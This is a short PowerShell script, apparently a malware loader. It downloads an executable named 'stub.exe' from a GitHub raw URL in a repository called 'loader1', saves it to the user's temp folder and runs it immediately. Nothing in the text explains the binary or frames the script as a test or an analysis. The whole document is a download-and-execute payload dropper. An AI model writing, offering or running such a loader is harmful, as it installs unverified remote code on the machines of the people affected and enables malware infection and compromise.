$stub = "https://raw.githubusercontent.com/qzl44/loader1/main/stub.exe"
$output = "$env:TEMP\stub.exe"
Invoke-WebRequest $stub -OutFile $output
Start-Process $output
